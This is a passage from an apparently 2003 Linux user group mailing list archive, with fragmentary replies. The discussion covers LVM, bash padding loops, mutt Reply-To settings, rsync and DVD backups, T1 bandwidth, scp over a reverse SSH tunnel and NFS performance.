to be actually useful--another reason I like reiserfs, it does this
instantly and without preperation, in a logged filesystem) and at will--
no reboot after fdisk. No need to tar-pipe or dump/restore your files
around new drive layouts: I just move the PE's for volumes I want on
new arrays or drives from the old drive to the new drive--it's live
and transparent.

Also, if your bootloader can load the initrd, then you never, ever need
to worry about what physical disk contains your system. LVM will
autodetect the devices that form the volume groups and let the system
boot from there. I've gone back and forth between md, ide, scsi, and
scsi raid without ever *touching* my /etc/fstab or kernel root
parameter.

Like I said, there is almost no reason "you" (i.e., in the general sense)
shouldn't be running LVM right now. Like backups are insurance against
failure, LVM is "insurance" against future configuration changes
("failure to think"? :).

While we're all on the "wishful thinking" bandwagon, I know myself and
perhaps a few others would like a "omit reply-to header" option under
your personal subscription options. I'd even consider learning Python if
it'd be accepted by admins here.

Oh, man... I'd love that, too.

My ex-roomie was a mailman hacker (wrote some accepted patches... wrote a
whole version that did keysigning to and from the list).  Lemme see if he
knows how to make this real real fast. (note the non-redundant use of the
word "real")

In the more "bleeding edge" category: http://l7-filter.sf.net/

This will be able to throttle/block matched traffic regardless of what
port it runs on. I'm using the QoS version for 2.4 right now, although
current development is all being done on 2.6 (hence 'bleeding' comment
above).

(And I wrote a null qdisc kernel module so I could use QoS to block.)

Subject: [PLUG] bash decimal interpretation
Message-ID: <Pine.LNX.4.52.0312030149340.32649@shaft.bitmine.net>

I have to write little bash loops all the time.  Usually, this is just to
handle bulk renames and things.  Fairly frequently, I have to deal with
this booger:

jbrelin at person:~/$ for a in `seq -w 1 10`;do b=$[$a+5];echo $a $b;done
01 6
02 7
03 8
04 9
05 10
06 11
07 12
bash: 08: value too great for base (error token is "08")

What's the deal with that crap?

OK, it makes perfect sense.  Bash is interpreting numbers that begin with
0 as octal... says so right in the man page.  But why in all of heaven
would it go ahead and do that when the number CAN'T be octal?!?

And I can't find a simple way to treat the number correctly.

Also, how am I supposed to pad that with 0s to get the right length again?
I mean, I could go ahead and do some garbage where I check the length and
add leading 0s until it gets up there, but that seems absurd and doesn't
help in the general case when you don't know what the greatest length is
going to be until you're at the end of the loop.

Grrr.

Try:

for a in `seq 1 10`;do b=$[$a+5];printf "%02d %02d\n" $a $b;done

(Std Disclaimer: printf is a bashism)

Kills two birds in one stone, perhaps. Note lack of "-w" argument,
particularly.

Um... but what if I don't know how wide I need the output?  (considering
it's in a script)

It'll just overflow the width. "5" becomes "05", but "123" becomes
"123". It does, however, beg the question of "why pad if you don't know
how wide you want it?"

Well, it's that I want it all the same length.  So I have to figure out
the length of the longest one and pad to that.  -w does this for me.

It's not that I don't know how long I want it, I just don't know yet.

Well, you're issuing "seq 1 bar", so why not do:

export WIDTH=`echo -n $bar | wc -c`
for a in `seq 1 $bar`; do printf "%0${WIDTH}d\n" $a; done

Getting uglier by the minute, but it works.

Um, I'm really not trying to get you to do my work here... but I have one
more problem to which I don't see the (surely) obvious answer.

Do I just backtick that to get it into a variable I can actually use?

b=`printf "%0${WIDTH}d" $a`

That's the best way?

AFAIK, sure.

I would point out that parenthesis command-substitution is faster and
more easily nestable and looks nicer. I haven't used it because I feared
you might confuse braced variable substitution. Additionally bracket
expressions are deprecated and will be removed soon. Double-paren
expressions replace them. So, from the top it might look like:

export WIDTH=$(echo -n $END|wc -c)
for a in $(seq 1 $END); do 
  b=$(printf "%0${WIDTH}d" $((a+5)))
  echo $b
done

Though I'm a bit pressed to see why you need to pretty print into a
variable other than to save on typing, maybe. Certainly it may start
getting treat as octal again. ;-)

Another nice approach:

WIDTH=$(echo -n $END|wc -c)
FORMAT="%0${WIDTH}d %0${WIDTH}d\n"
export FORMAT     # may not be necessary, depending

for a in $(seq 1 $END); do
  printf "$FORMAT" $a $((a+5))
done

I.e., remember you *can* do something like:

FORMAT="You want to change file %0${WIDTH}d to file %0${WIDTH}d\n"

and the result will be along the lines of

You want to change file 01 to file 06
You want to change file 02 to file 07
You want to change file 03 to file 08
You want to change file 04 to file 09
...

The thing about XFS's dump is that it lets you archive the ACLs. Since
XFS+Samba is the only current method (of which I'm aware, anyway) to
have a Linux box serve up a network filesystem with full NT-ish ACLs,
then it's all you've got.

Why not just have it only do the right thing, and omit the reply-to
header always?  It's 2003.  If your MUA doesn't have such basic
functionality as reply-to-list, file a serious bug report and switch
to one that does.

Not a complete solution, but I'm running flexbackup to make a uniquely
named, compressed file for disk to disk copy of the /home directory.
After that I copy it to a shared CD-ROM drive that I write several
backups on before it fills.

While I'm not happy with the way I'm writing the CD, flexbackup does a
great job of making my backups.

While not directly related to the mailing lists discussion, I would like
to know if any of the OSDL folks are involved in the PLUG, and if not,
what would it take to get them involved.

Since we have one of the most important entities in the development of open
source software here in the area, it would be quite interesting to hear
what is going on there. Perhaps they could provide the speaker and
location for a future Advanced Topics talk?

reply-to wars have been ongoing for at least a decade now.  if
your mua can't deal sensibly with inconsistent use of reply-to,
maybe you should switch to one that can?

I am quite satisfied with the command line, even on Windoze. It keeps me in
practice.

A question about acceptable performance for a T1 line.  We just
switched providers and I'm seeing less than pleasing performance on my
connection speed.  Our line is 512kbps and I know that some drop is
expected during peak hours but yesterday I measured from 60kbps to
227kbps during the work day then up to 453kbps at about 6:00 pm.  Are
these numbers to be expected from a T1 line?

Interesting... I hadn't realized they made T1 lines that slow.

I thought a T1 line, by definition, was 1.54Mbps.

How are you measuring that speed?

I would honestly appreciate it if you could point me to how I can
configure Mutt to handle the presence of Reply-To: or not in one unified
manner of my choosing. (And why doesn't it out of the box, being the
"hacker's choice MUA".)

Many folks are splitting their T1 into sets for voice channels and using
it in eighths (IIRC) for data and voice. It's an interesting solution,
since it saves money on both voice and data.

Maybe he's only dealing with part of his T1.

  Actually, to be pedantic about it, 1.544Mbps is the total line speed. The
actual usable bandwidth is commonly 1.536Mbps.  It's composed of 24 64Kbs
channels.  The extra 8Kb is an overhead bit used for framing and CRC.

  You can lose another 192Kb if the T1 channel is not 8 bit clean.  You get
24x56Kb channels instead of 24x64Kb.  The network steals one bit per 64Kb
channel to maintain 1's density on the T1.  It leaves you with 1.344Mbps T1
line.

The only "modern" FS. ext2 does this, too, but it has none of the
features we all seem to be looking for. :-) Plus I don't *think* you can
back up ACL's easily. But I haven't tried, so don't take my word for it.

The way I have mine configured, I can hit ",L" (comma, capital 'L') to
reply to list. At the same time, I can hit ,r to go to the author only,
and ,g to go to both the author and the list. 

Check if this is in your ~/.muttrc:

   bind pager ,L   list-reply

and then, I have this:

lists plug plug-talk

I have other lists as well, but those are the two relevant ones. 

Also, I see this:

## This is new - and you should know about it:
  set ignore_list_reply_to  # ignore the "Reply-To" lines
                            # which point back to the mailing list -
                            # YES!

The bug has to do with building a threaded perl in conjunction with
vim, so it's distribution specific.

Karsten posted some updated RPMs here:

http://people.redhat.com/karsten

which is interesting.  He originally told me that they were
in Raw Hide, and I searched up and down both the Red Hat FTP
site as well as the Fedora FTP site.  Does anyone know
where Raw Hide really is?

Okay, I *have* found how to configure the "list-reply" feature. But
you have to tell it in advance which addresses are mailing lists. And it
still honors Reply-To:  unless I set ignore_list_reply_to. There
is a patch for RFC 2369 support, but it's not there by default. I should
go look at it and see why it isn't in Debian.

Ultimately, all I want is a consistent, automatic way, no matter which
mailbox I'm in and no matter how badly mangled the mail is, for me to
be able to hit one key for "reply to everybody" and one key to "reply
only to the sender". From any mail client without having to futz with
options to no end. Is this too much to ask?

Yeah, thanks to me reading the manual I discovered much of this. :-)

Reply-To: still subverts my desired effect for non-list traffic from
people that *do* use Reply-To: for it's originally intended purpose of
directing recipients to the senders real address (rather than trusting
From:)

Now that I have my client suitably configured to ignore fields the way I
prefer, I'll invariably spark the "Why Did You Cc: Me? I'm Subscribed To
the List" wars. Which will bring up the the "Mail-Followup-To: Isn't a
Real Standard" wars. Which still leads me to believe that Reply-To: is
the root of evil here. I don't see why such an option in your
subscription options can be *harmful*.

Oh, and joy of joys: supporting RFC 2369 in an MUA requires you to be
able to parse HTTP URLs. What was that about UNIX tools doing one thing
well? We don't need no stinkin' orthogonal standards here.

Message-ID: <20031203184050.GB3056@gate.kl-ic.com>

As a devoted recent convert to rsync/dirvish backup, I could hijack
this thread (disk to disk backup is *SO* much faster, cheaper, easier).
But that would be rude ...

I am curious whether there are DVD-R changers out there.  Most systems
are much bigger than 4.7GB, and I've always found it painful to partition
data to match the backup medium (lots of wasted space, lots of fumbling
with tape M of N, etc.).  DVD-R drives run about $150-$250 without
changers;  the high cost of media and the labor-intensive changing of
disks would tempt one to forgo frequent backups. 

I back up 80GB every night (onto hard disks);  at 10MB/sec (8x DVD-R)
that would take 2+ hrs per day and 17+ media for a full dump, though
incrementals would be a lot cheaper.  Still, that sounds like $2K/yr
and an awful lot of time, along with the annoyingly cumbersome 
restore process incremental backups lead to.  

I understand Russell Senior will be telling us about using rsync for
backups at the December advanced topics (Russell, email me about this!)
and it might be worthwhile to learn about rsync and disk-to-disk before
committing to the expense and bother of alternatives.

Most iptables tutorials suggest you close all ports and open them as needed.  It's a better approach, and it should save you from chasing down unwanted traffic.

I don't think anyone would argue about the benefits of disk-to-disk
backups.  However, offline media has its place too.  If there were one
perfect solution for all applications the whole storage consulting
industry would collapse.  Not that this would be an entirely bad thing...

Try:

http://www.google.com/search?q=DVD-R+jukebox

Generally these are geared for the business archiving market and priced
accordingly.  ($8,000.00 or more)  If you're fretting the cost of media,
then these probably aren't a good choice.  ;-)

You'll also have the issue of compatibility with your backup server OS
and software since each jukebox uses its own proprietary command set for
moving media around.

This might be a good warmup for the rsync talk:

http://www.mikerubel.org/computers/rsync_snapshots/

In this, Mike discusses how to use rsync and hard links to create some
really space-efficient incremental backups on disk.  Perfect for archiving
to DVD-R and putting away into that safe deposit box.  ;-)

I just did a test.  If there's other traffic on the line, it subtracts
from the bandwidth the site shows.  So when I ran it with no other
network traffic, I got 2,414 kbps, but with a Mandrake ISO downloading
at ~1,500 kbps from limestone.uoregon.edu, I only got 889 kbps. (neener)

So it's all those other users denying you your preciousss bandwidth.

And, yes, there are such things as fractional T1s.  Use part for 'net,
part for interoffice, part for phone lines (with T1 you get ANI.)

afaik, the work on getting a clean and stable implementation of POSIX
ACLs (or somethings closely akin to them) into ext2/3 is ongoing. The
last I heard, which admittedly was a few months ago, was that there
were some stability problems. I haven't looked recently.

I hope the title of this message isn't too confusing.
I wasn't sure what title would be most appropriate.

The use of an offboard drive controller (Promise
Ultra100 TX2) has raised difficulties with Linux that
have still not been resolved.

Giving Red Hat (8 & 9) the kernel parameter "linux
ide=reverse" does not seem to help. Perhaps the stock
kernel does not recognize it. In any case, I haven't
been able to install either of these releases at all.
Red Hat's technical support strikes me as quite
incompetent, so I'd rather not invoke it (as by the
purchase of a retail package for this purpose).

Mandrake comes pretty close: the drives turn up as hda
and hdb. Trouble is, the optical drives "disappear"
and I can't find out what happened to them. Perhaps
turning off recognition of the onboard controller, if
that's what Mandrake does, results in not dealing with
ATAPI devices on that controller properly, either.
(That's probably the kind of optical drives that most
people have.) I an not a heavy CD user. Could this
problem be circumvented by using a USB optical drive,
or by connecting the ATAPI drives to the add-on
controller? Mandrake's support is somewhat helpful. Of
course, they really want you to join the club. 

I ordered SuSE (OEM) from Ebay, and think I'll try
that, too. You can get it there for $10, and SuSE does
not offer downloadable iso's. Maybe they've got
everything under...control? If not, I may use a
procedure such as the one that seems to be necessary
with Mandrake.

Your line wrapping is broken...

Most iptables tutorials suggest closing down all ports and opening them
as needed, yes... but they're usually talking about the INPUT
chain/table/whatever... so there is no chance you're listening on a port
you don't want to be listening on.

That is *not* the same thing as what Billy was looking for.  The
limitation mentioned above limits who can access you, not what you can
access.  Billy was looking (assuming he was talking about rules on a
gateway box) to limit what users of his network are able to access. 
Defaulting to DROP, IMHO, would cause a bit of a pain in the neck. 
You'd have to set rules for each individual port you wished users of
your network to have access to... and that list would get quite long
pretty quick.  

I think it would be just as easy to just set up a SOCKS proxy in that
case, and deal with that, disabling all forwarding altogether.  That
would give you more control, I think.

I don't think that's worth it for most networks, though, as it's a royal
pain in the ass for everybody involved.

You might want to consider setting up SNMP to give you real time stats
of your pipe, this will give you a much better indication of real
bandwidth usage.  Then to test through put, download a couple of ISO
images and watch the SNMP monitor.

It is also possible to order a partial T1 from your service provider.  I
used to work at a place that had a 384k partial T1.  It used the
frame-relay scheme that seemed to suck up bandwidth when you needed it
most (lots of lost packets, re-sends and time-outs).  Upgrading to a
full T1 with a Point-to-Point scheme made a huge difference.

Good Luck,

I seem to recall that the Debian Woody install works if the bf4 kernel
is selected during the boot process, at least it worked for HotPoint
controllers.

Boot-off-board-device-first does have to be compiled into the kernel to
work.  Seems kind of silly that RH didn't do that.

I wonder if they did something like Knoppix, where all ATAPI devices get
the ide-scsi treatment, dmesg should shed some light on that.

There's the PowerFile R200 series.  200 discs and 1-2 drives for
$2,500-$7,000 depending on configuration.  Yes, that's not quite a
terabyte of near-line storage for several times the cost of the
equivalent capacity in online IDE RAID. 

Heck, the radiotelescope guys just move data around by FedExing a Linux
box that's stuffed with big IDE discs.  Just plug it into power and GigE
and you're ready to go.

Note that there *are* reasons (mostly legal and administrative) to have
optical changers, and the R200 is a bargain compared to other solutions.

Ayup, that's the case if you want to backup data on media that's too
small for the job.  Removable discs must always trail fixed ones
(because of mechanical factors and a rougher environment), and tape
seems to be approaching its limits (because of the limits of flexible
media, or maybe just insufficient R&D).

Note that IOMega's latest high-capacity medium (Rev) is essentially a
stripped-down 35GB laptop hard-drive.

Incrementals aren't so bad if you make them relative to the last full
backup.  It's stacked incrementals that *really* suck.

Indeed.  It's all about choices and flexibility, innit?

This is the part I disagree with. Make if OFF by default.

I don't want the headers from the other lists. I don't want anything 
from the other lists. If I wanted a digest, I'd subscribe to the digest. 
But I don't. I suspect most others feel the same way. Maybe not.

He said digest. If that means the headers, great, I still don't want it. 
I thought digests were all the posts for the day bundled into one large 
email, with subjects at the top of the email. No thank you.

I would accept one exception to this, though: If I only got a digest for 
threads I had previously participated in. That would be Ok.

within Mutt as PLUG is currently configured:

reading message you decide you want to reply, press 'r'
mutt prompts "Reply to plug at lists.pdxlinux.org? ([yes]/no): ", press 'n'
mutt shows:  "To: Person Name <pname at domain.tld>", edit or press enter to accept

Yeah, that was a good article.

It's *much* more than that.  Among other things, it's a good intro to
the ancient art of politicking.  Money is merely the easiest and
quickest method of lobbying, not the only one.

I'm glad he's spending his time on more important things than following
Yet Another high-traffic list.  I doubt he follows Linux-Kernel, either.
That said, it'd be cool to get him into town for a teach-in.

Many flavors of dump allow you to exclude files. None that I know of have
the ability to exclude ACLs or permissions from dumps. You don't need to
tell dump to backup ACLs, you get them and any other filesystem-specific
extras archived no matter what.

Thanks, Paul, but the only vim SRPM in there is from February 2003.

I'm not sure where in the RedHat ftp sites he put it, but I was able to
download from his website, so I'm in good shape.

The only other part was a brief bit of output about what is going on in
the other lists sent to the main list once a day.  We're talking a
single email of less than 100 lines of text in it.  Probably quite a bit
less.  I ran through what I think would be nice output on the list,
which would be sent daily or weekly or whatnot, over every post since
August 27th, and it came to 1081 lines.

FWIW, I was thinking about just doing the output of something like this,
replacing Inbox-PLUG with a daily generated mbox file for each list, a
seperate file for each list, with seperate sections or each list:

grep "^Subject" Inbox-PLUG | sed -e 's/re: //gi' | sed -e 's/subject: //gi' | sed -e 's/\[PLUG\] //gi' | sort -n | uniq -c | sort -n 

If David is thinking of something totally different... that's ok by me. 
It isn't like I put a ton of work into that line.  :-)

Nah, give it all away, then you can spend the time answering everyone's
questions about hard link magic and rsync directory syntax.  ;-)

It might also be worthwhile talking a bit about the problems rsync has on
files with a large amount of changes since people have been talking about
backing up some truly immense systems.

A good description of the problem is at:

http://www.mail-archive.com/rsync at lists.samba.org/msg07806.html

I've switched to using the CVS version of rsync for large file syncs.
Unfortunately, it's not protocol compatible with the non-CVS versions.

No, you miss the point. I have to remember: "Now was PLUG the one that
had Reply-To:? So I hit rn to reply direct and r to reply 'group'. Or
was it 'normal' like other mailing lists and email I receive in my inbox
and then I hit r to reply and g to reply 'group'." I don't want to
remember a dozen little bits of trivia. I want two keys that just
work exactly the same way, always.

I've found what I want, but not only do I have to pre-describe mailing
lists, I have to tell Mutt to explicitly ignore the extra 'garbage'.
Before I started contributing to the plug list more actively, I didn't
have to think about this. Ever.

Indeed it does most of the time.  However, it has to guess if I want the
line to be broken up or not.  For example, I don't want commandlines,
URLs, Message IDs, or things of a technical nature broken up.  Regular
paragraphs that are just broken on a single line - no, I'm ok with those
being broken up.

When quoting a message, Evolution assumes we'll break the lines
ourselves if the one we're responding to didn't want to break any lines,
so we we don't end up with funky quotes of quotes or break quoted URLs
and the like.

It just makes things easier for all involved if we email line-wrapped
posts, doesn't it?

Actually, there are bit torrents out there. I downloaded it a few weeks ago 
after reading their license very carefully.  As far as I can tell, I can use 
copies _iff_ there is nothing charged for them.  The torrent "master" site 
that I used seems to be down now so my .torrent file won't be of use.

Good look and let us know what works.  This cannot be that uncommon a case for 
server systems!

That article is a bit confusing. It suggests that Linus' statements
regarding dump were only related to live backups. I don't see how the
following statement can be construed that way:

Linus: "Dump was a stupid program in the first place. Leave it behind."

Subject: [PLUG] Kernel upgrades on Slackware
Message-ID: <Pine.LNX.4.56.0312031634330.14027@salmo.appl-ecosys.com>

  On my Red Hat systems a kernel upgrade requires that the new package be
installed (rather than upgrading or freshening the existing kernel), then
manually moved to /boot and lilo/grub hand edited. Is the procedure the same
with Slackware?

  When I upgrade the distribution the kernel, modules and other critical
components are replaced. Of course, the new one doesn't take over until the
system is rebooted, but the files are put in the proper directory and
lilo is updated to reflect the new kernel and modules. How do I handle the
upgrade from 2.4.22 to 2.4.23?

Thanks,

Rich

Hmm, can't remember ever having a problem.  Everything's always installed in 
its proper place and grub/lilo got automatically edited with the new entries.

Have done an Update on the kernel, which is bad.  I rebooted as fast as 
possible after relizing my mistake--not sure why the system didn't come to a 
screeching halt, nor why the .rpm even allows that on the kernel package.

  I can use scp to copy files from my main workstation/server to the
laptops, but not the other direction.

  From the laptop, when I try 'scp salmo:<filename> .' I see:
ssh_exchange_identification: Connection closed by remote host.

  So, do I need to make changes to /etc/ssh/ssh_config or
/etc/ssh/sshd_config? And, on which machine? I've managed to get myself
quite confused here at what needs to be set where for 2-way communications.

... and I suspect Linus has never had a job that involved helping someone
restore a "missing file .... somewhere on the xxxx file share ... last week,
I think".  Being able to load a tape, and then sit down with the user while
we browse for the missing entity has been a God-send.  (I've even had a
couple of instances where after it was found on tape, we go back to the
server and lo-and-behold, there it is!  ... in a folder that wasn't

Mine handles reply-to correctly, and I have reply-to-list as well.
Setting reply-to back to the list is considered borken behavior by
every RFC I've come across as well.  Seems like it ended long ago and
people need to get with the '00s already.

Don't worry about Reply and Reply All behavior, look up how to use
reply-to-list.  Long story short, if you add lines like this one to
your ~/.muttrc, all you have to do after that is hit L to reply to
list.

subscribe plug at lists.pdxlinux.org

You can specify as many mailing list addresses as you like per
subscribe line, and as many subscribe lines as you want.

Other MUA's that aren't still in the stone age in this regard are
kmail and sylpheed-claws off the top of my head, but I know there's
many more.

That's why urlview exists.  Seriously.  In Mutt, hit C-b and it'll pop

How can you say this *and* say that restore isn't fs-specific (prior
msg)? What if I archive an ext2 system with ACL and restore to XFS with
totally different ACL structures? Or what if I restore sensitive data,
unwittingly, to a filesystem that doesn't support ACL's at all and the
file is readable by the wrong people?

It still doesn't excuse writing an Internet standard that requires a

It looks like this is most often caused by an overly strict
/etc/hosts.deny

I am a bit confuse, you can copy from your workstation to your laptop,
or you can copy from the laptop to the server?

"scp salmo:<filename> ."

will copy <filename> from salmo to the local box (even if salmo is the
local box), so I'm assuming the server is salmo---although that might
be part of your problem, a confounded command line.  I'll call the
laptop "laptop".

Also note that you can use scp to copy to a remote host, or from a
remote host, which is different from invoking scp from one host, or
invoking it from another host.

You probably need to change /etc/ssh/sshd_config on salmo.

This trick to reverse-ssh should also work (posted on here a while back):


# on salmo do this:
ssh -f -N laptop -R22000:localhost:22

#now, on laptop you can do this:

scp -p 22000 localhost:<filename> .

which will copy the file from _salmo_ to the laptop (despite the
localhost in the command line---the first command sets up a tunnel
from laptop:22000 to salmo:22).

Although, even better: Tell the client to just use their desktop machine
to search with a GUI for the file in question and select any of several
different incremental versions available either in online, near-line, or 
archival storage from your IBM ADSM/TSM backup server.

But, admittedly, this costs a lot more. :-)

Please start a new thread when you start a new topic, don't just reply

Subject: [PLUG] OT: standards and design
Message-ID: <20031204024510.GA30462@maybe.net>

Re: the "if we followed your suggestion technology would never advance"

Yes it would. I'm arguing that orthogonal standards design is critical.
Should KDC's really be required to learn about Win2K ACL's in order to
continue doing their job of "managing passwords" (to put it simply)? Was
it a good idea to add <FONT> tags and sundry to let what was meant to be
a document structure language be abused as a document presentation
standard? Should "ls" know how to mount nfs volumes (hypothetically)?

We can design *standards* to be orthogonal (no strong cross-dependencies,
no whole sort of general mish-mash, no strong overlap of purposes) and let
*solutions* cross-integrate them. The operating system can talk to an
authorization and an authentication server seperately, but the servers
in question don't need to do each others' jobs. Maybe this argues that
I'm wrong -- many MUA's deal with mixed HTML/HTTP and RFC822 with flair.
I just think it's wrong for an RFC to an existing standard to draw on a 
"foreign" data format. I suppose at some point it comes down to taste,
after all that's the great thing about standards -- there's so many to
choose from!

This is waaayyy off-topic for the technical list, and I recommend
further commentary be taken to plug-talk, which I don't subscribe to --
feel free to Cc: me, if you want. (Normally, anything approaching what
I'd think would be plug-talk otherwise, I ignore the whole thread. So, I
doubt I'd *want* to subscribe to plug-talk. 8-D) I won't say any more,
cross my heart.

Eh, I think he leaves out some pretty important and interesting stuff that
Russell is sure to cover.

He does some things the hard way and other things without real thought for
future maintainability (like properly date stamping the backups).

Anyway, I'm looking forward to the talk on the 17th.

The power of having a consistant ACL changing interface, unfortunatly of
course we don't have one.  :-(  So you'll only restore the FS specific
stuff if the API and features match. I haven't played with ACLs much, but
the recommended action is to use ACLs to add access, not remove it,
specifically for cases like this (the other one being fsck saving the
file, but not the ACL).

Parser error:  you're okay with paragraphs broken on a single line being
broken up?  I guess that means you want me to wrap my lines for you.

Apparently your client doesn't recognize a paragraph and wrap it for
you, which is strange.  Most clients do that.  Tried sylpheed-claws?

Well, personally, I prefer long lines.  They make more sense, taken as
raw data.  But just for you, I flipped a switch in my client that said
"wrap before sending".  Let me know if it flips your own.

I agree with Jantzen.  Email clients should be text browsers, not HTML
browsers.  Web browsers should not be email clients and IRC clients and
News clients and WYSIWYG HTML editors.  And operating systems should not
be Web servers and media players and messaging services that are active
by default.  Modularity means the best of breed--rather than the
biggest--can prevail.

Just my opinion.

This is why ACLs will continue to suck until we get a unified and
consistent standard.  ;-)  Since UNIX treats everything as a stream of
bytes and ACLs lie outside that stream, unless each and every program
supports the particular ACL implementation for the filesystem in use
something as simple as making a copy or compressing a file will destroy
the ACLs.

If using ACLs it's important to be fail-safe so that if the ACLs are
removed, less access is given rather than more.

The dump/restore in use on Linux doesn't support ACLs, though it *is* kind
enough to warn you if it detects that you have them on a particular inode.

I agree with that.  However, having it highlight or readily pipe to
urlview is really handy, and that's how I interpret that RFC.

I actually have almost no idea what it means (so if you have any
guesses please let me know), but if you want to find out where I got
it, then google-as-a-phrase should tell you.

However, in context, not knowing what it means hasn't really

The first hit suggests it is a Hindu saying, quoted in "A Short Walk in
the Hindu Kush", by Eric Newby.  Still doesn't explain its meaning,
though.  Very mysterious.

The third hit is a post of yours on the r-help mailing list (you're
famous!), but the fifth reminded me that Frodo Baggins lost a finger at
Mordor in "Lord Of the Rings".  But I don't think your exact sig'
appears there.

I think it's a metaphor after all.  We may not all be perfect, but we're
all the same, or something like that. . . .

Granted, it is a pleasant absurdity.

Right, except it wasn't a Hindu.  It was from a Bashgali Kafir (from a
region of Afghanistan) phrase book.  "Hindu Kush" apparently means
something like a place where you slaughter Hindus.  They evidently
weren't getting along over there for some reason when they named the
place.

Hmm.  I am evidently doing something wrong.  I get an order of

over an nfs mount.  I am just looking at "blocks out" from a "vmstat

That *is* pretty odd.

Hmmmm...

Well, what options are you using to mount? And what options in
/etc/exports?

mount options are: rw,sync,hard,intr,addr=192.168.0.55
/etc/exports options are: rw,sync

The server is running a 2.6.0-test11 kernel, the clients are mixed
2.4.2x and 2.6.0-test11.

FWIW, when I tested this out on a few unsuspecting W2K boxes, I had to
load drivers (FujiFilm had a driver online).  Another solution
suggested by a NZ resident and former PLUG member was that photo shops
there will burn your pictures to a CD-ROM for you, which skips neatly
over the USB issue.

Well, those all seem pretty sane. You might try rsize=4096,wsize=4096 on
mount just to be explicit.

2.6 vs 2.6 still has the same behavior? I could imagine 2.4 vs 2.6 being
"out of sync" somehow.

Yup.  Actually, the 2.6.0-test11 client has these mount options:

  rw,sync,hard,intr,rsize=8192,wsize=8192,addr=192.168.0.55

Well, as I mentioned in my "first" email, [rw]size=8192 can result in
worse performance. Maybe not the factor you're seeing, but it can affect
things. (Unless your client *is* an Alpha or ia64 or such :-D)

After discussing this briefly with Russell yesterday, I came home and
tested myself...

I'm getting about the same performance as Russell (surpisingly)... and
that's on a 10Mbps ethernet running NFSv2.

Can you repeat the test with the server booted into a recent 2.4
kernel? On the nfs mailing list, there have been repeated attempts to
figure out some 2.6-specific write problems. Trond's current hunch is
that the 2.6 VM mechanism has a bug that's getting tickled, but no one
knows for sure yet.

Try bing http://www.cnam.fr/reseau/bing.html

Bing will allow you to measure bandwidth by hop. Pick a host, do a
traceroute to it , and then use bing on the hops along the way. I like
to use large and small packets.

bing -s 64 -S 1024 localhost gateway
bing -s 64 -S 1024 localhost nexthop
...

This will help you understand where bandwidth issues really are. No
point beating up your ISP if the issue is upstream from them or in your
own network.

Thank you

I'm not familiar with what bing does, but remember when using a tool
like bing or mtr or even traceroute, that responding back with the icmp
ttl expired messages for traceroute or icmp echo replies for pings is
about last on the list of priorities for a router. You may get what look
like slow hops in the middle when your end to end latency is still fine.

Interesting concept.

Problem is from the above page the download site doesn't exist.  With a 
swift whack of a clue stick I searched on rpmfind and got it.

For S&G I ran it against a host I admin and got some interesting results 
that didn't have anything to do with the time.  I got several messages 
like this

	bing: packet (92 bytes) from unexpected host 66.190.251.135

which interestingly enough reverses back to

	ts46-04-qdr901.mdfrd.or.charter.com.

There were many other IPs.

I have a bit more reading to do but can any network experts on the list 
explain what this is?

2.4.22 on the client, 2.4.9 on the server.

I could update that server.  Probably will do that right now.

I don't think so.  Either, a) launch mozilla with another profile, or 2) ssh 
in and killall mozilla-bin then restart mozilla.

The bummer about using two profiles is that don't (can't?) share bookmarks.

IIRC, tried this but new additions wouldn't take.  I think, too, the mail

First off, sorry about the tight space/hardware thing. I know how it feels.

I've never had any issue with Linux LVM except earlier versions stalling
the system excessively during a volume move on a heavily loaded live
server. Additionally, EVMS is ported from use in AIX on zSeries mainframes,
et. al. I, personally, first ran into LVM on an HP-UX mini I assisted in
running ... hmmm ... thinks ... 11 years ago? The concept is well-tested
and a core part of "enterprise".

Implementation bugs are just as bad as any other bug, really. Early 2.5
had IDE data corruption bugs. Versions of ext3 have had corruption bugs
(I lost the journal on my laptop, for example). Potential LVM bugs aren't
any more "special".  You always want to play it safe when upgrading your
kernel or doing any kind of major build. And see if new techniques or
methods you're looking into adopting are robust in design and concept.

You can pvmove extents to any device you want. You can even initially
create volumes specifically on any physical device of your choosing.

No, you need userspace tools to detect and activate the volumes because
the kernel doesn't have the bloat to walk the disk structures to autodetect
the major/minors for the volume block devices. This scenario will become
the norm, more than the exception for many subsystems with 2.6. (Although
2.6 makes initrd's even more transparent.)

Well, yes, I do have a fixed, tiny /boot partition. :-)

/me investigates.

Ah. Didn't know that had gone beyond "just ext2". (I think the last time
I looked at that must've been around RH6.2) Still, mounting /dev/vg0/root
instead of the Linux-specific label syntax "feels" more portable to me
across UNIXen. To me.

I'm just pointing to the "yet". Better to start now and have it at your
fingertips when "yet" comes, than try to revamp everything. Kind of like
backups: you aren't *planning* to have a system failure, but it's a
possibility, so it's good to have your options open. Although one could
say, I'm just encouraging better planning in this regard, now that I
look at it. :-)

Maybe my sense of perspective is warped: building large storage servers,
using NetApps, etc where having an LVM is like air and water to me. :-)
I still maintain that you should start with one as your initial install
as long as you're doing anything more complex than "firewall", "web
appliance", or "email pop toaster". Although I admit your language of
"reduce complexity" does sound like you tend towards this field.

Disclaimer: the info below isn't going to be very useful, since I
can't recall the app. name at the moment.

There exists a program that emulates an X server, and will pipe the
I/O from applications attached to that X server to some other X server
that can be changed dynamically.  Basically it acts like "screen" for
graphical apps, allowing you to do what you describe.

Unfortunately, I can't remember what it's called.  Perhaps knowing it
does exist will trigger someone's memory, or I may find it again (I'm
trying to dig it up again).

I know some of you thinkers must enjoy a game of chess.  Having
installed xscreensaver recently, I was just watching the 3D chess game
and thinking, wow, that looks really nice:  there should be a playable
version of this.

Deja vu!  I had the same thought last time I installed xscreensaver, but
I couldn't find anything that looks as nice as that damned screen saver.
 Anyone know one?  I'd like player-vs-player mode, game saves, and mouse
rotation of the board, ideally.

I just came across a package called rfb, a program in that package
called x0rfbserver is a version of vncserver that will export the
current X-session (instead of starting a fresh one) , just like a
winblows box!  Doesn't sound like the one you were thinking of, but it
might do the job.

Subject: [PLUG] trying to determine corrupted .files
Message-ID: <1070578226.6399.64.camel@kat.zotnet.com>

I have a partially recovered system where many of the .files are
corrupted.

I am trying to determine a way to determine which of the . files are
corrupted, but this appears to not be trivial.  The criteria I would
love is:

1)  Known text file only.
2)  Has binary information in it.

An example:
.gnupg/options
         To enable full OpenPGP compliance you ^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
        ...
        @ou should make sure that you have read t
        # Options for GnuPG
